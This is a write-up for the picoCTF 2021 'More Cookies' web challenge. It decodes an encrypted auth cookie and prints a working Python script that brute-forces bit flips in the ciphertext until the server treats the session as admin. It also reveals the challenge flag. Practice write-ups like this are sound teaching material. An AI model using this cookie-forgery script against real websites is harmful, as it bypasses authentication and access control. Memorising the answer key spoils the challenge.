# More Cookies

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 90
Tags: picoCTF 2021, Web Exploitation
Author: MADSTACKS
 
Description:
I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! 

http://mercury.picoctf.net:15614/

Hints:
1. https://en.wikipedia.org/wiki/Homomorphic_encryption
2. The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name
```

## Solution

Browse to the web site with your browser (I used Google Chrome).   
Press F12 to open DevTools and go to the `Application` tab.  
Under `Storage` and then `Cookies` select the web site.  
There is a cookie named `auth_name` with a value that looks like Base64-encoded data.

### Analyse the cookie

Lets decode it
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/More_Cookies]
└─$ echo "M0ZPa2VWZ1Y1bTFuc0ZJWGNBK2hUTU1Ccmt6VElYajBScjBtLzVPOUpTWlc3d212VUJ2WWNEYjBadTVoT2kyWE9YUDA2cStaWVBWdzFPV21aNWRnRzlqeHBzT0l2TGhwSUlmQXVXMDNtcmpMUVVpbHcrZUxlWURqYlV3cG9ERmM=" | base64 -d
3FOkeVgV5m1nsFIXcA+hTMMBrkzTIXj0Rr0m/5O9JSZW7wmvUBvYcDb0Zu5hOi2XOXP06q+ZYPVw1OWmZ5dgG9jxpsOIvLhpIIfAuW03mrjLQUilw+eLeYDjbUwpoDFc
```

Looks like Base64 again.
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/More_Cookies]
└─$ echo "M0ZPa2VWZ1Y1bTFuc0ZJWGNBK2hUTU1Ccmt6VElYajBScjBtLzVPOUpTWlc3d212VUJ2WWNEYjBadTVoT2kyWE9YUDA2cStaWVBWdzFPV21aNWRnRzlqeHBzT0l2TGhwSUlmQXVXMDNtcmpMUVVpbHcrZUxlWURqYlV3cG9ERmM=" | base64 -d | base64 -d
�S�yX�mg�Rp�L��L�!x�F�&���%&V�  �Pp6�f�a:-�9s�ꯙ`�p���g�`��È��i ���m7���AH����y��mL)�1\

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/More_Cookies]
└─$ echo "M0ZPa2VWZ1Y1bTFuc0ZJWGNBK2hUTU1Ccmt6VElYajBScjBtLzVPOUpTWlc3d212VUJ2WWNEYjBadTVoT2kyWE9YUDA2cStaWVBWdzFPV21aNWRnRzlqeHBzT0l2TGhwSUlmQXVXMDNtcmpMUVVpbHcrZUxlWURqYlV3cG9ERmM=" | base64 -d | xxd -g 1   
00000000: 33 46 4f 6b 65 56 67 56 35 6d 31 6e 73 46 49 58  3FOkeVgV5m1nsFIX
00000010: 63 41 2b 68 54 4d 4d 42 72 6b 7a 54 49 58 6a 30  cA+hTMMBrkzTIXj0
00000020: 52 72 30 6d 2f 35 4f 39 4a 53 5a 57 37 77 6d 76  Rr0m/5O9JSZW7wmv
00000030: 55 42 76 59 63 44 62 30 5a 75 35 68 4f 69 32 58  UBvYcDb0Zu5hOi2X
00000040: 4f 58 50 30 36 71 2b 5a 59 50 56 77 31 4f 57 6d  OXP06q+ZYPVw1OWm
00000050: 5a 35 64 67 47 39 6a 78 70 73 4f 49 76 4c 68 70  Z5dgG9jxpsOIvLhp
00000060: 49 49 66 41 75 57 30 33 6d 72 6a 4c 51 55 69 6c  IIfAuW03mrjLQUil
00000070: 77 2b 65 4c 65 59 44 6a 62 55 77 70 6f 44 46 63  w+eLeYDjbUwpoDFc
```

Since the encryption is [Homomorphic](https://en.wikipedia.org/wiki/Homomorphic_encryption), changes made to the encrypted form will also affect the decrypted form.  
We can exploit this with a [Bit-flipping attack](https://en.wikipedia.org/wiki/Bit-flipping_attack).

### Write a brute forde solver

Lets write a brute force solver script that bit-flips each bit for each byte in the cookie
```python
#!/usr/bin/python

import requests
from base64 import b64decode, b64encode
import re

URL = 'http://mercury.picoctf.net:15614/'
COOKIE = "auth_name"
FLAG_FORMAT = r'picoCTF{[^}]+}'

# Get the cookie
s = requests.Session()
r = s.get(URL)
cookie = s.cookies[COOKIE]
raw_cookie = bytearray(b64decode(b64decode(cookie)))

# Brute force bit-flipping
flag_found = False
for index in range(len(raw_cookie)):
    for i in range(8):
        mask = 1 << i
        #print(f"Bit-flipping index {index} with mask {hex(mask)}")
        raw_cookie[index] ^= mask
        
        flipped_cookie = b64encode(b64encode(raw_cookie)).decode("ascii")
        r = requests.get(URL, cookies = {COOKIE: flipped_cookie})
        match = re.search(FLAG_FORMAT, r.text)
        if match:
            flag_found = True
            print(f"Bit-flipped index {index} with mask {hex(mask)}")
            print(f"Flag: {match.group(0)}")
            break
        raw_cookie[index] ^= mask
    if flag_found:
        break
```

### Get the flag

Then we make sure the script is exacutable and run it
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/More_Cookies]
└─$ chmod +x get_flag.py 

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/More_Cookies]
└─$ ./get_flag.py
Bit-flipped index 9 with mask 0x1
Flag: picoCTF{cO0ki3s_yum_a9a19fa6}
```

For additional information, please see the references below.

## References

- [Wikipedia - HTTP cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
- [Wikipedia - Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption)
- [Wikipedia - Bit-flipping attack](https://en.wikipedia.org/wiki/Bit-flipping_attack)
